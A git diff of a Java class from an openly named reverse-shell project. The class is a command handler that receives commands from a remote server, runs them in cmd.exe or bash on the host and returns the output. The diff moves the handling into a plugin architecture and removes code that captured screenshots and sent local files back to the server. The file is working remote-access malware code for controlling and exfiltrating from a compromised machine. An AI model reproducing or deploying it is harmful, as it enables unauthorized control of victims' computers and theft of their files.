@@ -1,111 +1,63 @@
 package obs1d1anc1ph3r.reverseshell;
 
 import java.io.*;
-import java.nio.file.Files;
 import java.util.concurrent.TimeUnit;
+import java.util.logging.Logger;
+import obs1d1anc1ph3r.reverseshell.plugins.CDCommand;
+import obs1d1anc1ph3r.reverseshell.plugins.CommandPlugin;
 
 public class CommandHandler {
 
+    private static final Logger logger = Logger.getLogger(CommandHandler.class.getName());
     private final ServerConnection serverConnection;
-    private final ScreenShot screenShot;
-    private String currentDir = System.getProperty("user.dir");
+    private final PluginManager pluginManager;
 
-    public CommandHandler(ServerConnection serverConnection) {
+    public CommandHandler(ServerConnection serverConnection, PluginManager pluginManager) {
         this.serverConnection = serverConnection;
-        this.screenShot = new ScreenShot();
+        this.pluginManager = pluginManager;
     }
 
     public void handleCommands() throws IOException {
         String command;
         while ((command = serverConnection.readCommand()) != null) {
             if (command.equalsIgnoreCase("exit")) {
-                System.out.println("[-] Server disconnected.");
+                logger.info("Server disconnected.");
                 break;
             }
 
-            StringBuilder fullResponse = new StringBuilder();
+            String[] commandParts = command.split(" ", 2);
+            String commandName = commandParts[0].toLowerCase();
+            CommandPlugin plugin = pluginManager.getPlugin(commandName);
 
-            if (command.startsWith("cd ")) {
-                fullResponse.append(changeDirectory(command.substring(3).trim()));
-            } else if (command.equalsIgnoreCase("screenshot")) {
-                byte[] imageBytes = screenShot.imageBytes();
-                if (imageBytes != null && imageBytes.length > 0) {
-                    serverConnection.sendScreenShot(imageBytes);
-                } else {
-                    serverConnection.sendResponse("Error: Failed to capture screenshot.");
+            if (plugin != null) {
+                String response = plugin.execute(commandParts.length > 1 ? new String[]{commandParts[1]} : new String[]{});
+                if (response != null && !response.isEmpty()) {
+                    serverConnection.sendResponse(response);
                 }
-                continue;
-            } else if (command.startsWith("download")) {
-                String[] parts = command.split(" ", 2);
-                if (parts.length >= 2) {
-                    String filePath = parts[1].trim();
-                    handleDownload(filePath);
-                } else {
-                    serverConnection.sendResponse("Error: Invalid download command syntax.");
-                }
-                continue;
             } else {
-                fullResponse.append(executeCommand(command));
-            }
-            if (fullResponse.length() > 0) {
-                serverConnection.sendResponse(fullResponse.toString().trim());
+                String response = executeCommand(command);
+                serverConnection.sendResponse(response);
             }
         }
     }
 
-    private void handleDownload(String filePath) {
-        File file = new File(filePath);
-        if (!file.isAbsolute()) {
-            file = new File(currentDir, filePath);
-        }
-
-        try {
-            file = file.getCanonicalFile();
-            if (!file.exists()) {
-                serverConnection.sendResponse("Error: File not found at " + file.getAbsolutePath());
-                return;
-            }
-            if (!file.isFile()) {
-                serverConnection.sendResponse("Error: Path is not a file: " + file.getAbsolutePath());
-                return;
-            }
-            if (!file.canRead()) {
-                serverConnection.sendResponse("Error: File is not readable: " + file.getAbsolutePath());
-                return;
-            }
-
-            byte[] fileBytes = Files.readAllBytes(file.toPath());
-            serverConnection.sendResponse("file download");
-            serverConnection.sendFile(fileBytes);
-        } catch (IOException ex) {
-            serverConnection.sendResponse("Error: Unable to process file at " + file.getAbsolutePath() + " - " + ex.getMessage());
-        }
-    }
-
-    private String changeDirectory(String newDir) {
-        File dir = new File(newDir);
-        if (!dir.isAbsolute()) {
-            dir = new File(currentDir, newDir);
-        }
-        try {
-            dir = dir.getCanonicalFile();
-            if (dir.isDirectory()) {
-                currentDir = dir.getAbsolutePath();
-                return "Changed directory to: " + currentDir;
-            } else {
-                return "Error: Not a valid directory.";
-            }
-        } catch (IOException e) {
-            return "Error: Unable to change directory - " + e.getMessage();
-        }
-    }
-
-    private String executeCommand(String command) {
+    public String executeCommand(String command) {
         StringBuilder output = new StringBuilder();
         try {
-            ProcessBuilder processBuilder = new ProcessBuilder(OSUtils.getShell(), OSUtils.getShellFlag(), command);
-            processBuilder.directory(new File(currentDir));
+            String os = System.getProperty("os.name").toLowerCase();
+            String shell;
+            String shellFlag;
+            if (os.contains("win")) {
+                shell = "cmd.exe";
+                shellFlag = "/c";
+            } else {
+                shell = "/bin/bash";
+                shellFlag = "-c";
+            }
+
+            ProcessBuilder processBuilder = new ProcessBuilder(shell, shellFlag, command);
             processBuilder.redirectErrorStream(true);
+            processBuilder.directory(new File(CDCommand.getCurrentDirectory()));
             Process process = processBuilder.start();
 
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
